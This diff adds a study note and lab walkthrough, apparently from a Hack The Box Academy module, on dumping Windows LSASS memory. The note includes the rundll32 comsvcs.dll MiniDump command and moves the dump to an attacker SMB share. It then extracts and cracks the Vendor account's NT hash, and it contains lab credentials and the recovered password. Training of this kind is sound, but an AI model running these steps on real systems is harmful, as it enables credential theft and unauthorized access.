@@ -1,1 +1,103 @@
+In addition to getting copies of the SAM database to dump and crack hashes, we will also benefit from targeting LSASS. As discussed in the Credential Storage section of this module, LSASS is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems.
+
+
+Upon initial logon, LSASS will:
+
+* Cache credentials locally in memory
+* Create access tokens
+* Enforce security policies
+* Write to Windows security log
+
+Let's cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.
+
+Dumping LSASS Process Memory
+Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump. Let's cover techniques that can be performed using tools already built-in to Windows.
+
+Task Manager Method
+With access to an interactive graphical session with the target, we can use task manager to create a memory dump. This requires us to:
+
+1. Open Task Manager > 2. Select the Processes tab > 3. Find & right click the Local Security Authority Process > 4. Select Create dump file
+
+A file called lsass.DMP is created and saved in:
+
+C:\Users\loggedonusersdirectory\AppData\Local\Temp
+
+This is the file we will transfer to our attack host. We can use the file transfer method discussed in the Attacking SAM section of this module to transfer the dump file to our attack host.
+
+Rundll32.exe & Comsvcs.dll Method
+The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called rundll32.exe. This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.
+
+Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to lsass.exe. This can be done from cmd or PowerShell:
+
+Finding LSASS PID in cmd
+From cmd, we can issue the command tasklist /svc and find lsass.exe and its process ID in the PID field.
+
+EXAMPLE: C:\Windows\system32> tasklist /svc
+
+Image Name                     PID Services
+========================= ======== ============================================
+System Idle Process              0 N/A
+System                           4 N/A
+Registry                        96 N/A
+smss.exe                       344 N/A
+csrss.exe                      432 N/A
+wininit.exe                    508 N/A
+csrss.exe                      520 N/A
+winlogon.exe                   580 N/A
+services.exe                   652 N/A
+lsass.exe                      672 KeyIso, SamSs, VaultSvc
+svchost.exe                    776 PlugPlay
+svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
+                                   SystemEventsBroker
+fontdrvhost.exe                812 N/A
+
+Finding LSASS PID in PowerShell
+From PowerShell, we can issue the command Get-Process lsass and see the process ID in the Id field.
+
+EXAMPLE: PS C:\Windows\system32> Get-Process lsass
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+   1260      21     4948      15396       2.56    672   0 lsass
+Once we have the PID assigned to the LSASS process, we can create the dump file.
+
+Creating lsass.dmp using PowerShell
+With an *elevated* PowerShell session, we can issue the following command to create the dump file:
+
+EXAMPLE: PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+
+
+CHALLENGE: 10.129.202.149
+
+Question 1 - What is the name of the executable file associated with the Local Security Authority Process?
+1) from section and work we know its lsass.exe 
+
+Question 2  RDP to 10.129.202.149 (ACADEMY-PWATTACKS-LSASS) with user "htb-student" and password "HTB_@cademy_stdnt!" - Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)
+1) xfreerdp /v:10.129.202.149 /u:htb-student /p:HTB_@cademy_stdnt! /dynamic-resolution 
+2) open powershell as admin 
+3) in powershell -> Get-Process lsass
+output: 
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+   1199      24     5668      15204       0.55    664   0 lsass
+4) pay attention to id as thats what we will need to dump the lsass file 
+5) still in Powershell -> rundll32 C:\windows\system32\comsvcs.dll, Minidump <id> 664 C:\lsass.dmp full
+6) after that runs successfully on HOST machine open an smbserver.py ->
+sudo smbserver.py share . -smb2support
+7) back to PS session lets move the lsassdmp to our host machine 
+PS SYNTAX: move C:\lsass.dmp \\10.10.15.252\share 
+8) now we have it on our host machine but we need to install pypykatz to dump successfully 
+9) ON HOST MACHINE -> pip3 install pypykatz 
+10) after successful install -> pypykatz lsa minidump lsass.dmp 
+output: 
+== MSV ==
+		Username: Vendor
+		Domain: FS01
+		LM: NA
+		NT: 31f87811133bc6aaa75a536e77f64314
+		SHA1: 2b1c560c35923a8936263770a047764d0422caba
+		DPAPI: 0000000000000000000000000000000000000000
+
+11) hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt -> cracked -> 31f87811133bc6aaa75a536e77f64314:Mic@123 
+vendor:Mic@123
 
